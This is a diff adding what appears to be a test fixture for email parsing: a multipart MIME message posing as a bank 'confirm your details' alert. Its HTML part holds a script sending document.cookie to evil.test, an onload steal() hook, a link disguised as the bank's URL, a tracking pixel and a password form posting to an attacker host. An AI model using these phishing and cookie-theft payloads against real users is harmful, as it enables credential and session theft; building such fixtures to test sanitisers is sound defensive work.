@@ -1,0 +1,54 @@
+From: "Account Team" <alerts@example-bank.test>
+To: Sam Lee <sam@example.org>
+Cc: Priya Shah <priya@example.org>
+Subject: Action needed: confirm your details
+Date: Thu, 15 Oct 2026 09:41:00 +0100
+Message-ID: <tricky-1@example-bank.test>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="MIX"
+
+--MIX
+Content-Type: multipart/alternative; boundary="ALT"
+
+--ALT
+Content-Type: text/plain; charset=utf-8
+
+Please confirm your details at https://example-bank.test/confirm today.
+
+--ALT
+Content-Type: multipart/related; boundary="REL"
+
+--REL
+Content-Type: text/html; charset=utf-8
+
+<html><head><style>.title { font-weight: bold; color: #003366 } .hide { display:none }</style>
+<script>document.location='https://evil.test/?c='+document.cookie</script></head>
+<body onload="steal()">
+<div class="hide">Preheader you never see</div>
+<p class="title">Please confirm your details</p>
+<p>Visit <a href="https://evil.test/login">https://example-bank.test/login</a> today.</p>
+<p><img src="cid:logo@bank" width="80" height="20" alt="Bank logo"></p>
+<p><img src="https://cdn.evil.test/banner.png" alt="Big banner" width="600" height="200"></p>
+<img src="https://track.evil.test/open?id=42" width="1" height="1">
+<form action="https://evil.test/steal"><input name="password"><button>Sign in</button></form>
+</body></html>
+
+--REL
+Content-Type: image/png
+Content-ID: <logo@bank>
+Content-Transfer-Encoding: base64
+
+iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==
+
+--REL--
+
+--ALT--
+
+--MIX
+Content-Type: application/pdf; name="statement.pdf"
+Content-Disposition: attachment; filename="statement.pdf"
+Content-Transfer-Encoding: base64
+
+JVBERi0xLjQK
+
+--MIX--
